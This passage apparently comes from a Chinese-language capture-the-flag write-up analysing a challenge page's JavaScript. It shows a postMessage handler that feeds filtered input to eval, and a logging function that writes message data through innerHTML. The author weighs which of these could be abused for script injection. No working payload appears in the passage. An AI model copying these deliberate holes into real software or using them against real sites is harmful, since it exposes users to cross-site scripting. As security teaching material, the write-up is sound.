keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// make object look like string</span><br>        <span class=\"token keyword\">let</span> log <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>prefix<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">let</span> line <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"li\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">let</span> prefix_tag <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">let</span> text_tag <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">'info'</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightcyan'</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">'success'</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightgreen'</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">'warn'</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightyellow'</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">'err'</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightpink'</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span> <br>                <span class=\"token keyword\">default</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>                    line<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundColor <span class=\"token operator\">=</span> <span class=\"token string\">'lightcyan'</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>            <span class=\"token punctuation\">}</span><br>            <br>            data <span class=\"token operator\">=</span> <span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>safe<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>                data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&amp;lt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br><br>            prefix_tag<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> prefix<span class=\"token punctuation\">;</span><br>            text_tag<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span><br><br>            line<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>prefix_tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            line<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>text_tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#console'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span> <br><br>        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Connection status: '</span><span class=\"token punctuation\">,</span> window<span class=\"token punctuation\">.</span>navigator<span class=\"token punctuation\">.</span>onLine<span class=\"token operator\">?</span><span class=\"token string\">\"Online\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"Offline\"</span><span class=\"token punctuation\">)</span><br>        <span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>cmd<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">\"log\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[log]: \"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">\"anchor\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[anchor]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">s</span><span class=\"token punctuation\">(</span><span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token function\">u</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">case</span> <span class=\"token string\">\"clear\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                    document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#console'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[???]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Wrong command received: \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>cmd<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><br>                <span class=\"token punctuation\">}</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c4936ad76292ee7100ecb9d72054e71f<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>top<span class=\"token punctuation\">.</span><span class=\"token constant\">DEV</span><span class=\"token punctuation\">)</span><br>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Production build!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <br>            <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">checkCredentials</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">username<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">let</span> users <span class=\"token operator\">=</span> top<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">let</span> access <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>users<span class=\"token punctuation\">.</span>admin<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>moderator<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>manager<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>users <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>x <span class=\"token keyword\">of</span> access<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username <span class=\"token operator\">&amp;&amp;</span> x<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">)</span><br>                            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>            <span class=\"token punctuation\">}</span><br><br>            <span class=\"token keyword\">let</span> _onmessage <span class=\"token operator\">=</span> onmessage<span class=\"token punctuation\">;</span><br>            <span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m<span class=\"token punctuation\">.</span>credentials <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">checkCredentials</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// do nothing if unauthorized</span><br>                <span class=\"token punctuation\">}</span><br>            <br>                <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">case</span> <span class=\"token string\">\"ping\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// check the connection</span><br>                        e<span class=\"token punctuation\">.</span>source<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>message<span class=\"token operator\">:</span><span class=\"token string\">'pong'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span><br>                    <span class=\"token keyword\">case</span> <span class=\"token string\">\"logv\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// display variable's value by its name</span><br>                        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[logv]: \"</span><span class=\"token punctuation\">,</span> window<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span><br>                    <span class=\"token keyword\">case</span> <span class=\"token string\">\"compare\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// compare variable's value to a given one</span><br>                        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[compare]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>variable<span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span><br>                    <span class=\"token keyword\">case</span> <span class=\"token string\">\"reassign\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// change variable's value</span><br>                        <span class=\"token keyword\">let</span> o <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">;</span><br>                        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                            <span class=\"token keyword\">let</span> RegExp <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[s-zA-Z-+0-9]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span><br>                            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid input given!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                            <span class=\"token punctuation\">}</span><br>                            <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                            <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Value of \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\" was changed to \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'warn'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                            <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Error changing value (</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>err<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">)</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                        <span class=\"token punctuation\">}</span><br>                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span><br>                    <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>                        <span class=\"token function\">_onmessage</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// keep default functions</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// hide this script on production</span><br>            document<span class=\"token punctuation\">.</span>currentScript<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./analytics/main.js?t=1627610836<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這個頁面的程式碼比其他兩頁多很多，而且可以找到一些我們需要的東西，比如說 <code>eval</code>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> _onmessage <span class=\"token operator\">=</span> onmessage<span class=\"token punctuation\">;</span><br><span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m<span class=\"token punctuation\">.</span>credentials <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">checkCredentials</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// do nothing if unauthorized</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token comment\">// ...</span><br>        <span class=\"token keyword\">case</span> <span class=\"token string\">\"reassign\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// change variable's value</span><br>            <span class=\"token keyword\">let</span> o <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">let</span> RegExp <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[s-zA-Z-+0-9]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid input given!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Value of \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\" was changed to \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'warn'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Error changing value (</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>err<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">)</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">_onmessage</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// keep default functions</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>但這邊的 <code>eval</code> 似乎沒辦法讓我們直接執行想要的程式碼，因為規範滿嚴格的（大寫字母、部分小寫字母、數字跟 +-），可能是有其他用途。</p>\n<p>另外一個有機會的地方是這裡：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> log <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>prefix<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">let</span> line <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"li\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">let</span> prefix_tag <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">let</span> text_tag <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token comment\">// not important</span><br>    <span class=\"token punctuation\">}</span><br>    <br>    data <span class=\"token operator\">=</span> <span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>safe<span class=\"token punctuation\">)</span><span class=\"token 